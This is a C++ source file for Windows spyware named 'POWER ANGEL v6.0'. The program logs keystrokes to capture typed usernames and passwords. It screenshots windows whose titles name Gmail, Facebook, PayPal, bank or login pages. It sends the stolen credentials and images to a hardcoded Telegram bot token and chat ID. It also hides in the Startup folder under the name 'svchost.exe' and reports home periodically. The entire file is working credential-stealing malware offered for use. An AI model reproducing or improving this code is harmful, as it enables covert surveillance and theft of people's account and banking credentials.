#define WIN32_LEAN_AND_MEAN
#define STRICT
#define _CRT_SECURE_NO_WARNINGS
#define UNICODE

#include <windows.h>
#include <objidl.h>
#include <gdiplus.h>
#include <winhttp.h>
#include <commctrl.h>
#include <shellapi.h>
#include <mutex>
#include <thread>
#include <string>
#include <vector>
#include <algorithm>
#include <cctype>
#include <sstream>
#include <iomanip>
#include <fstream>

#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "winhttp.lib")

using namespace Gdiplus;

// 🔥 CONFIG
const char* BOT_TOKEN_ANSI = "7979273216:AAEW468Fxoz0H4nwkNGH--t0DyPP2pOTFEY";
const char* CHAT_ID_ANSI = "7845441585";
const wchar_t* MUTEX_NAME = L"PowerAngelSmartMichael_v6.0";

// Globals
std::mutex g_mutex;
std::wstring g_username, g_password;
bool g_running = true;
ULONG_PTR g_gdiplusToken;
HHOOK g_hKeyboardHook = NULL;
std::wstring g_currentField;

// Debug
void DebugLog(const std::wstring& message) {
    std::wofstream logfile(L"angel_debug.log", std::ios::app);
    if (logfile.is_open()) {
        SYSTEMTIME st;
        GetLocalTime(&st);
        logfile << L"[" << st.wHour << L":" << st.wMinute << L":" << st.wSecond << L"] ";
        logfile << message << std::endl;
        logfile.close();
    }
}

// 🔥 PERFECT UTF8 CONVERSION
std::string WStringToUTF8(const std::wstring& wstr) {
    if (wstr.empty()) return "";
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);
    std::string str(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &str[0], size_needed, NULL, NULL);
    str.pop_back(); // Remove null terminator
    return str;
}

// 🔥 TELEGRAM SENDER - FULLY UNICODE SAFE
bool SendTelegram(const std::wstring& message) {
    std::string msg8 = std::string(CHAT_ID_ANSI) + "&text=" + WStringToUTF8(message);
    
    HINTERNET session = WinHttpOpen(L"PowerAngel/6.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
                                   WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!session) return false;
    
    HINTERNET connect = WinHttpConnect(session, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!connect) {
        WinHttpCloseHandle(session);
        return false;
    }
    
    // Build URL properly
    std::wstring wtoken(BOT_TOKEN_ANSI, BOT_TOKEN_ANSI + strlen(BOT_TOKEN_ANSI));
    std::wstring url = L"/bot" + wtoken + L"/sendMessage";
    
    HINTERNET request = WinHttpOpenRequest(connect, L"POST", url.c_str(), 
                                          NULL, WINHTTP_NO_REFERER, 
                                          WINHTTP_DEFAULT_ACCEPT_TYPES, 
                                          WINHTTP_FLAG_SECURE);
    if (!request) {
        WinHttpCloseHandle(connect);
        WinHttpCloseHandle(session);
        return false;
    }
    
    LPCWSTR contentType = L"Content-Type: application/x-www-form-urlencoded\r\n";
    WinHttpAddRequestHeaders(request, contentType, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD);
    
    BOOL result = WinHttpSendRequest(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0, 
                                    (LPVOID)msg8.c_str(), (DWORD)msg8.length(), 
                                    (DWORD)msg8.length(), 0);
    
    if (result) WinHttpReceiveResponse(request, NULL);
    
    WinHttpCloseHandle(request);
    WinHttpCloseHandle(connect);
    WinHttpCloseHandle(session);
    return result != FALSE;
}

// 🔥 PHOTO UPLOADER - FIXED BOUNDARY
bool SendTelegramPhoto(const std::wstring& filepath) {
    DebugLog(L"📸 UPLOADING: " + filepath);
    
    HANDLE hFile = CreateFileW(filepath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, 
                              OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;
    
    DWORD fileSize = GetFileSize(hFile, NULL);
    std::vector<BYTE> fileData(fileSize);
    DWORD bytesRead;
    ReadFile(hFile, fileData.data(), fileSize, &bytesRead, NULL);
    CloseHandle(hFile);
    
    if (bytesRead != fileSize) return false;
    
    char boundary[64];
    sprintf_s(boundary, "----AngelBoundary%llu", GetTickCount64());
    
    std::string header = 
        std::string("--") + boundary + "\r\n"
        "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + std::string(CHAT_ID_ANSI) + "\r\n"
        "--" + std::string(boundary) + "\r\n"
        "Content-Disposition: form-data; name=\"caption\"\r\n\r\n"
        "📸 POWER ANGEL v6.0 Screenshot\r\n"
        "--" + std::string(boundary) + "\r\n"
        "Content-Disposition: form-data; name=\"photo\"; filename=\"screenshot.jpg\"\r\n"
        "Content-Type: image/jpeg\r\n\r\n";
    
    std::string footer = "\r\n--" + std::string(boundary) + "--\r\n";
    
    std::vector<BYTE> postData;
    postData.insert(postData.end(), header.begin(), header.end());
    postData.insert(postData.end(), fileData.begin(), fileData.end());
    postData.insert(postData.end(), footer.begin(), footer.end());
    
    HINTERNET session = WinHttpOpen(L"PowerAngel/6.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
                                   WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!session) return false;
    
    HINTERNET connect = WinHttpConnect(session, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!connect) {
        WinHttpCloseHandle(session);
        return false;
    }
    
    std::wstring wtoken(BOT_TOKEN_ANSI, BOT_TOKEN_ANSI + strlen(BOT_TOKEN_ANSI));
    std::wstring photourl = L"/bot" + wtoken + L"/sendPhoto";
    
    HINTERNET request = WinHttpOpenRequest(connect, L"POST", photourl.c_str(), 
                                          NULL, WINHTTP_NO_REFERER, 
                                          WINHTTP_DEFAULT_ACCEPT_TYPES, 
                                          WINHTTP_FLAG_SECURE);
    if (!request) {
        WinHttpCloseHandle(connect);
        WinHttpCloseHandle(session);
        return false;
    }
    
    std::string contentType = "Content-Type: multipart/form-data; boundary=" + std::string(boundary);
    std::wstring wcontentType(contentType.begin(), contentType.end());
    WinHttpAddRequestHeaders(request, wcontentType.c_str(), (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD);
    
    BOOL result = WinHttpSendRequest(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                    postData.data(), (DWORD)postData.size(), 
                                    (DWORD)postData.size(), 0);
    
    if (result) WinHttpReceiveResponse(request, NULL);
    
    WinHttpCloseHandle(request);
    WinHttpCloseHandle(connect);
    WinHttpCloseHandle(session);
    return result != FALSE;
}

// Keyboard hook
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pKb = (KBDLLHOOKSTRUCT*)lParam;
        
        if (pKb->vkCode == VK_TAB) {
            if (!g_currentField.empty()) {
                if (g_username.empty()) g_username = g_currentField;
                else g_password = g_currentField;
                g_currentField.clear();
            }
            return 1;
        }
        
        if (pKb->vkCode == VK_RETURN) {
            if (!g_username.empty() && !g_password.empty()) {
                std::wstring creds = L"🔥 POWER ANGEL v6.0 - CREDENTIALS:\n👤 " + g_username + L"\n🔑 " + g_password;
                SendTelegram(creds);
                g_username.clear();
                g_password.clear();
                g_currentField.clear();
            }
            return 1;
        }
        
        if ((pKb->vkCode >= 0x30 && pKb->vkCode <= 0x39) || 
            (pKb->vkCode >= 0x41 && pKb->vkCode <= 0x5A)) {
            BYTE keyState[256] = {0};
            WCHAR buffer[10] = {0};
            GetKeyboardState(keyState);
            
            if (GetAsyncKeyState(VK_SHIFT) & 0x8000) keyState[VK_SHIFT] = 0x80;
            if (GetAsyncKeyState(VK_CAPITAL) & 0x0001) keyState[VK_CAPITAL] = 0x01;
            
            int result = ToUnicode(pKb->vkCode, pKb->scanCode, keyState, buffer, 10, 0);
            if (result > 0) g_currentField += buffer[0];
        }
    }
    return CallNextHookEx(g_hKeyboardHook, nCode, wParam, lParam);
}

// Screenshot utils
std::wstring GetActiveWindowTitle() {
    HWND hwnd = GetForegroundWindow();
    if (!hwnd) return L"";
    WCHAR title[512];
    return GetWindowTextW(hwnd, title, 512) > 0 ? std::wstring(title) : L"";
}

bool IsLoginPage(const std::wstring& title) {
    if (title.empty()) return false;
    std::wstring lower = title;
    std::transform(lower.begin(), lower.end(), lower.begin(), ::towlower);
    std::vector<std::wstring> targets = {L"gmail", L"facebook", L"login", L"signin", L"bank", L"paypal"};
    for (auto& t : targets) if (lower.find(t) != std::wstring::npos) return true;
    return false;
}

// 🔥 FIXED SCREENSHOT WITH PROPER GDI+
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT  num = 0;          
    UINT  size = 0;         
    ImageCodecInfo* pImageCodecInfo = NULL;
    GetImageEncodersSize(&num, &size);
    if(size == 0) return -1;
    pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
    if(pImageCodecInfo == NULL) return -1;
    GetImageEncoders(num, size, pImageCodecInfo);
    for(UINT j = 0; j < num; ++j) {
        if( wcscmp(pImageCodecInfo[j].MimeType, format) == 0 ) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }    
    }
    free(pImageCodecInfo);
    return -1;
}

bool TakeSmartScreenshot() {
    std::wstring title = GetActiveWindowTitle();
    if (!IsLoginPage(title)) return false;
    
    Sleep(200);
    
    HWND hwnd = GetForegroundWindow();
    HDC hdcScreen = GetDC(hwnd);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    RECT rc; GetWindowRect(hwnd, &rc);
    int w = rc.right - rc.left, h = rc.bottom - rc.top;
    
    if (w <= 0 || h <= 0) {
        ReleaseDC(hwnd, hdcScreen); 
        DeleteDC(hdcMem);
        return false;
    }
    
    HBITMAP hbm = CreateCompatibleBitmap(hdcScreen, w, h);
    HBITMAP old = (HBITMAP)SelectObject(hdcMem, hbm);
    BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
    
    Bitmap* bmp = Bitmap::FromHBITMAP(hbm, NULL);
    SelectObject(hdcMem, old);
    DeleteObject(hbm);
    DeleteDC(hdcMem);
    ReleaseDC(hwnd, hdcScreen);
    
    if (!bmp) return false;
    
    CLSID jpegClsid;
    GetEncoderClsid(L"image/jpeg", &jpegClsid);
    
    WCHAR tempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);
    SYSTEMTIME st; GetLocalTime(&st);
    WCHAR filename[MAX_PATH];
    swprintf_s(filename, L"power_angel_%04d%02d%02d_%02d%02d%02d.jpg",
               st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
    wcscat_s(tempPath, filename);
    
    // FIXED EncoderParameters - CORRECT SYNTAX
    EncoderParameters encoderParams;
    encoderParams.Count = 1;
    encoderParams.Parameter[0].Guid = EncoderQuality;
    encoderParams.Parameter[0].Type = EncoderParameterValueTypeLong;
    encoderParams.Parameter[0].NumberOfValues = 1;
    ULONG quality = 90;
    encoderParams.Parameter[0].Value = &quality;
    
    Status stat = bmp->Save(tempPath, &jpegClsid, &encoderParams);
    delete bmp;
    
    bool success = (stat == Ok) && SendTelegramPhoto(tempPath);
    return success;
}

// Persistence
void InstallPersistence() {
    WCHAR path[MAX_PATH], startup[MAX_PATH];
    GetModuleFileNameW(NULL, path, MAX_PATH);
    GetEnvironmentVariableW(L"APPDATA", startup, MAX_PATH);
    wcscat_s(startup, L"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svchost.exe");
    CopyFileW(path, startup, FALSE);
}

// Threads
void HeartbeatThread() {
    Sleep(60000);
    while (g_running) {
        SendTelegram(L"👼 POWER ANGEL v6.0 - Alive");
        std::this_thread::sleep_for(std::chrono::hours(6));
    }
}

void ScreenshotThread() {
    while (g_running) {
        TakeSmartScreenshot();
        Sleep(3000);
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    DeleteFileW(L"angel_debug.log");
    DebugLog(L"🚀 POWER ANGEL v6.0 STARTING");
    
    HANDLE mutex = CreateMutexW(NULL, TRUE, MUTEX_NAME);
    if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;
    
    GdiplusStartupInput input;
    GdiplusStartup(&g_gdiplusToken, &input, NULL);
    
    Sleep(2000);
    SendTelegram(L"🔥 POWER ANGEL v6.0 DEPLOYED! Keyboard + Screenshots ACTIVE");
    
    InstallPersistence();
    
    g_hKeyboardHook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
    
    std::thread heartbeat(HeartbeatThread);
    std::thread screenshot(ScreenshotThread);
    
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    g_running = false;
    if (heartbeat.joinable()) heartbeat.join();
    if (screenshot.joinable()) screenshot.join();
    if (g_hKeyboardHook) UnhookWindowsHookEx(g_hKeyboardHook);
    GdiplusShutdown(g_gdiplusToken);
    
    return 0;
}
